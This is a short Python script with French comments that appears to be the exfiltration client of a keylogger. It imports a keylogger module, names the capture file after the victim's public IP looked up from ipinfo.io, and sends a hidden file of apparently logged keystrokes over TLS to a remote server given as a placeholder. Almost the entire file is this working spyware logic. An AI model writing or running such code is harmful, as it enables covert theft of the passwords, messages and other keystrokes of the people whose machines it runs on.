import keylogger
import socket
import ssl
import requests

from datetime import datetime

def get_filename():
    now = datetime.now()
    response = requests.get("https://ipinfo.io")
    ip_data = response.json()
    public_ip = ip_data.get('ip')
    filename = public_ip+"-" +  now.strftime("%d-%m-%Y-%H:%M:%S") + ".keyboard.txt"
    return filename

def launch_keylogger():
    keylogger.listen_keyboard()

def send_file_securely(file_path, server_address, server_port, certificate_file):
    # Créer une socket TCP
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Créer un contexte SSL
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_verify_locations(certificate_file)

    # Établir une connexion sécurisée avec le serveur
    secure_socket = context.wrap_socket(client_socket, server_hostname=server_address)

    try:
        # Se connecter au serveur
        secure_socket.connect((server_address, server_port))

        # Envoyer le nom du fichier au serveur
        filename = get_filename()
        secure_socket.send(filename.encode())

        # Envoyer le contenu du fichier au serveur
        with open(".document1.txt", "r") as file:
            file_data = file.read()
            secure_socket.sendall(file_data.encode())

        print("Fichier envoyé avec succès.")
    except Exception as e:
        print(f"Erreur lors de l'envoi du fichier : {e}")
    finally:
        # Fermer la connexion
        secure_socket.close()

if __name__ == "__main__":
    file_to_send = "chemin_du_fichier.txt"
    server_address = "adresse_du_serveur"
    server_port = 12345
    certificate_file = "chemin_du_certificat.pem"

    send_file_securely(file_to_send, server_address, server_port, certificate_file)
